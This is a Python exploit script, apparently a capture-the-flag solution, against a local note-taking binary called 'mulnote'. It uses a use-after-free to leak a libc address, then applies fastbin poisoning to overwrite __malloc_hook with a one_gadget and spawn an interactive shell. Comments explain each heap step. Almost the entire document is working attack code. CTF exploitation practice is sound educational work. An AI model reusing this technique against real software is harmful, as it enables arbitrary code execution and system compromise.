from roppy import *


p = process("./mulnote")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size, note):
    p.sendlineafter(">", "C")
    p.sendlineafter(">", str(size))
    p.sendafter(">", note)

def edit(idx, note):
    p.sendlineafter(">", "E")
    p.sendlineafter(">", str(idx))
    p.sendlineafter(">", note)

def remove(idx):
    p.sendlineafter(">", "R")
    p.sendlineafter(">", str(idx))


def show():
	p.sendlineafter(">", "S")


'''
UAF Vulnerability and no check for the free'd note in edit
function, this leads us to the overwrting the fd of the fastbin chunk
which will return the value written to it in next allocation, hence we get 
an arbitrary data
'''

create(0x100, "A")
create(0x60, "B")
create(0x60, "C")

remove(0)
'''
Removing an unsorted bin from the list 
Since we can see the data off from the heap even it is free'd
The main_arena is propogated in the `fd` and `bk` pointer
we will get the easy leak
'''
show()
p.recvline()
leak = u64(p.recv(6).ljust(8, b"\x00"))
log.info("main_arena :    0x%x" %(leak))
libc.address = leak - 0x3c4b78
log.info("LIBC       :    0x%x" %(libc.address))
malloc_hook = libc.address + 0x3c4b10
log.info("malloc_hook:    0x%x" %(malloc_hook))
one_gadget = libc.address + 0x4527a
log.info("one_gadget :    0x%x" %(one_gadget))

'''
Remove the two allocated chunks
'''

remove(1)
remove(2)

'''
Making the `fd` pointer point to the `malloc_hook` - 0x23
the subtraction because the malloc will check if the size of the chunk is within
the fastbin range i.e. 0x20 - 0x80 inclusive.
'''

edit(2, p64(malloc_hook - 0x23)[:6])


'''
Get the first chunk
'''

create(100, "D")

'''
Get the second chunk, since the value we subtracted from
0x23 then we fill the address with NULL bytes, hence overwriting 
malloc_hook
'''
payload = b"\x00"*19
payload += p64(one_gadget)

create(100, payload)

log.success("Spawning shell")
create(10, '')
p.interactive()
